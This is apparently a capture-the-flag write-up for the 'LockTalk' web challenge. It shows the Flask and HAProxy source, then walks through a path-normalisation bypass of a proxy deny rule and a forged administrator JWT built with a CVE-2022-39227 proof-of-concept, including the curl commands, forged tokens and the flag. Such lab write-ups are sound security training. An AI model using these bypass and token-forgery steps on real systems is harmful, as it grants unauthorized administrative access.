# LockTalk

## Description

In "The Ransomware Dystopia," LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force, dedicated to protecting society from the insidious grip of ransomware. Chosen participants, tasked with representing their districts, navigate a perilous landscape fraught with ethical quandaries and treacherous challenges orchestrated by LockTalk. Their journey intertwines with the organization's mission to neutralize ransomware threats and restore order to a fractured world. As players confront internal struggles and external adversaries, their decisions shape the fate of not only themselves but also their fellow citizens, driving them to unravel the mysteries surrounding LockTalk and choose between succumbing to despair or standing resilient against the encroaching darkness.

## Analysis


::: details challenge/app/api/routes.py
```py
from flask import jsonify, current_app
import python_jwt as jwt, datetime
import json
import os

from app.middleware.middleware import *
from . import api_blueprint

JSON_DIR = os.path.join(os.path.dirname(__file__), 'json')

@api_blueprint.route('/get_ticket', methods=['GET'])
def get_ticket():

    claims = {
        "role": "guest", 
        "user": "guest_user"
    }
    
    token = jwt.generate_jwt(claims, current_app.config.get('JWT_SECRET_KEY'), 'PS256', datetime.timedelta(minutes=60))
    return jsonify({'ticket: ': token})


@api_blueprint.route('/chat/<int:chat_id>', methods=['GET'])
@authorize_roles(['guest', 'administrator'])
def chat(chat_id):

    json_file_path = os.path.join(JSON_DIR, f"{chat_id}.json")

    if os.path.exists(json_file_path):
        with open(json_file_path, 'r') as f:
            chat_data = json.load(f)
        
        chat_id = chat_data.get('chat_id', None)
        
        return jsonify({'chat_id': chat_id, 'messages': chat_data['messages']})
    else:
        return jsonify({'error': 'Chat not found'}), 404


@api_blueprint.route('/flag', methods=['GET'])
@authorize_roles(['administrator'])
def flag():
    return jsonify({'message': current_app.config.get('FLAG')}), 200
```
:::


::: details challenge/app/main/routes.py
```py
from flask import render_template

from . import main_blueprint

@main_blueprint.route('/', methods=['GET'])
def index():
    return render_template('/index.html')
```
:::


::: details challenge/app/middleware/middleware.py
```py
from flask import request, jsonify, current_app
from functools import wraps
import python_jwt as jwt

def authorize_roles(roles):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            token = request.headers.get('Authorization')

            if not token:
                return jsonify({'message': 'JWT token is missing or invalid.'}), 401

            try:
                token = jwt.verify_jwt(token, current_app.config.get('JWT_SECRET_KEY'), ['PS256'])
                user_role = token[1]['role']

                if user_role not in roles:
                    return jsonify({'message': f'{user_role} user does not have the required authorization to access the resource.'}), 403

                return func(*args, **kwargs)
            except Exception as e:
                return jsonify({'message': 'JWT token verification failed.', 'error': str(e)}), 401
        return wrapper
    return decorator

```
:::


::: details challenge/config.py
```py
from jwcrypto import jwk
import os

class Config:
    DEBUG = False
    FLAG = "HTB{f4k3_fl4g_f0r_t35t1ng}"
    JWT_SECRET_KEY = jwk.JWK.generate(kty='RSA', size=2048)
```
:::


::: details challenge/run.py
```py
from app import create_app

app = create_app()
```
:::


::: details conf/haproxy.cfg
```yaml
global
    daemon
    maxconn 256

defaults
    mode http

    timeout connect 5000ms
    timeout client 50000ms
    timeout server 50000ms

frontend haproxy
    bind 0.0.0.0:1337
    default_backend backend

    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
    
backend backend
    balance roundrobin
    server s1 0.0.0.0:5000 maxconn 32 check

```
:::


::: details conf/requirements.txt
```txt
# uwsgi
Flask
requests
python_jwt==3.3.3
```
:::


The application is based on JWT tokens, you can get token, join chat and get flag. The twist is the proxy:

```bash
frontend haproxy
    bind 0.0.0.0:1337
    default_backend backend
    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
```

Because of this rule any reqeust from anywhere is denied to get_ticket. But this limitation only works on given path. If you add `./` in path or `//` you will end up on same endpoint, but since path dont match with the rule you can bypass proxy restrictions. 

```powershell
➜ curl http://83.136.250.41:46240/api/v1/get_ticket
<html><body><h1>403 Forbidden</h1>
Request forbidden by administrative rules.
</body></html>

➜ curl http://83.136.250.41:46240/./api/v1/get_ticket
<html><body><h1>403 Forbidden</h1>
Request forbidden by administrative rules.
</body></html>

➜ curl http://83.136.250.41:46240/./api/v1/get_ticket --path-as-is
{"ticket: ":"<TOKEN>"}

➜ curl http://83.136.250.41:46240//api/v1/get_ticket --path-as-is
{"ticket: ":"<TOKEN>"}
```

Cool, we have a token. Now what?

In the source code we see `JWT_SECRET_KEY` is being set by `jwcrypto`, but the application is using `python_jwt` which doesn't make sense? Why have 2 packages that do almost the same thing. In the `requirements.txt` we see that this package is explicitly version 3.3.3 (`python_jwt==3.3.3`)

> **[python_jwt](https://pypi.org/project/python-jwt/)**: _Note:  Versions 3.3.4 and later fix a  [vulnerability](https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp)  (CVE-2022-39227) in JSON Web Token verification which lets an attacker with a valid token re-use its signature with modified claims. CVE to follow. Please upgrade!_

PoC: [SPLOITUS: CVE-2022-39227](https://sploitus.com/exploit?id=EA5AF022-9630-5498-B523-B8505AD5BCA6)

## Solution

Use the PoC script to change JWT token, token must be retrieved from get_ticket endpoint (important!) and change role to `administrator` to get flag.

```bash
└─$ py cve_2022_39227.py -j 'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAzNDcwMjQsImlhdCI6MTcxMDM0MzQyNCwianRpIjoiY3pwalljSjNuNnJCX2tleDRvanN1QSIsIm5iZiI6MTcxMDM0MzQyNCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.HCGrI1HWDDeHAbNySq1n-vIxVuBpw_HXvVZgIVpFbxNP1h0lkIOiUnPy1BKnIDhEYd44uHFv5BbZB9WiU5LbmCs7WwfkQLLAsOKDsz_KqCdpiWtY2X-kZCg-ZPJj8fOpbU3eosI0y-dQh15m3SrGLzvr3oAcsUdJt8fGB34amDXAPCR46XvXqrYw9ITdYlBv72fdb0H1wbYFgjcZTntD1ecaObnWQ_QrDnwvowxeapANUJceuWCBlpu_J31Re0goYuaP5brseyEEG8rfvx1BSSnTJaangVIilP2VBPxQhXWnjbeeJx4M_88puZ824LKIbLo0aRtuG03TMPFc4c5UrQ' -i 'role=administrator,user=administrator'
[+] Retrieved base64 encoded payload: eyJleHAiOjE3MTAzNDcwMjQsImlhdCI6MTcxMDM0MzQyNCwianRpIjoiY3pwalljSjNuNnJCX2tleDRvanN1QSIsIm5iZiI6MTcxMDM0MzQyNCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ
[+] Decoded payload: {'exp': 1710347024, 'iat': 1710343424, 'jti': 'czpjYcJ3n6rB_kex4ojsuA', 'nbf': 1710343424, 'role': 'guest', 'user': 'guest_user'}
[+] Inject new "fake" payload: {'exp': 1710347024, 'iat': 1710343424, 'jti': 'czpjYcJ3n6rB_kex4ojsuA', 'nbf': 1710343424, 'role': 'administrator', 'user': 'administrator'}
[+] Fake payload encoded: eyJleHAiOjE3MTAzNDcwMjQsImlhdCI6MTcxMDM0MzQyNCwianRpIjoiY3pwalljSjNuNnJCX2tleDRvanN1QSIsIm5iZiI6MTcxMDM0MzQyNCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiYWRtaW5pc3RyYXRvciJ9

[+] New token:
 {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAzNDcwMjQsImlhdCI6MTcxMDM0MzQyNCwianRpIjoiY3pwalljSjNuNnJCX2tleDRvanN1QSIsIm5iZiI6MTcxMDM0MzQyNCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiYWRtaW5pc3RyYXRvciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAzNDcwMjQsImlhdCI6MTcxMDM0MzQyNCwianRpIjoiY3pwalljSjNuNnJCX2tleDRvanN1QSIsIm5iZiI6MTcxMDM0MzQyNCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"HCGrI1HWDDeHAbNySq1n-vIxVuBpw_HXvVZgIVpFbxNP1h0lkIOiUnPy1BKnIDhEYd44uHFv5BbZB9WiU5LbmCs7WwfkQLLAsOKDsz_KqCdpiWtY2X-kZCg-ZPJj8fOpbU3eosI0y-dQh15m3SrGLzvr3oAcsUdJt8fGB34amDXAPCR46XvXqrYw9ITdYlBv72fdb0H1wbYFgjcZTntD1ecaObnWQ_QrDnwvowxeapANUJceuWCBlpu_J31Re0goYuaP5brseyEEG8rfvx1BSSnTJaangVIilP2VBPxQhXWnjbeeJx4M_88puZ824LKIbLo0aRtuG03TMPFc4c5UrQ"}

Example (HTTP-Cookie):
------------------------------
auth={"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAzNDcwMjQsImlhdCI6MTcxMDM0MzQyNCwianRpIjoiY3pwalljSjNuNnJCX2tleDRvanN1QSIsIm5iZiI6MTcxMDM0MzQyNCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiYWRtaW5pc3RyYXRvciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAzNDcwMjQsImlhdCI6MTcxMDM0MzQyNCwianRpIjoiY3pwalljSjNuNnJCX2tleDRvanN1QSIsIm5iZiI6MTcxMDM0MzQyNCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"HCGrI1HWDDeHAbNySq1n-vIxVuBpw_HXvVZgIVpFbxNP1h0lkIOiUnPy1BKnIDhEYd44uHFv5BbZB9WiU5LbmCs7WwfkQLLAsOKDsz_KqCdpiWtY2X-kZCg-ZPJj8fOpbU3eosI0y-dQh15m3SrGLzvr3oAcsUdJt8fGB34amDXAPCR46XvXqrYw9ITdYlBv72fdb0H1wbYFgjcZTntD1ecaObnWQ_QrDnwvowxeapANUJceuWCBlpu_J31Re0goYuaP5brseyEEG8rfvx1BSSnTJaangVIilP2VBPxQhXWnjbeeJx4M_88puZ824LKIbLo0aRtuG03TMPFc4c5UrQ"}
```

Get the flag with modified auth cookie. Via burp or just curl.

```bash
└─$ curl -H 'Authorization: {"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA0NDEyNjcsImlhdCI6MTcxMDQzNzY2NywianRpIjoiWnNKVGtuaWptZE96MHFyMzlGVC1EUSIsIm5iZiI6MTcxMDQzNzY2Nywicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiYWRtaW5pc3RyYXRvciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTA0NDEyNjcsImlhdCI6MTcxMDQzNzY2NywianRpIjoiWnNKVGtuaWptZE96MHFyMzlGVC1EUSIsIm5iZiI6MTcxMDQzNzY2Nywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"U6bVY1Iz9CmCLfOvoELZszsLjK-dq8U3oPfFWBMPy0YD4iaPIC8uLy-CSFRs_iRWkCVwCyPSAoaf8T3JLjEUeXqaiP7qGzAV_xxJMLUMV-puylSbYxg2ALWKX386ZD_nlA87P_9Ubf0jX9EKj3811yn0Q0pdSF4r66ENPj7hDUjukU5GoIHPpSbB0VsjmQ1lfk8re2uUcFgvMkChfYEib7_gXnaj42Idd6f0tFvUjiFj4NR2wbL5uBnaKE6Ed4sYOwMd5oPjK_-qQ5fFVlnJl8MFXQwoFlV2IbYwNK5jKrTFCUd2PGgCRC783ki20S-IUOzNeMiwKEd5stwvKD_l4w"}' 83.136.250.41:46240/api/v1/flag
{"message":"HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}"}
```
::: tip Flag
`HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}`
:::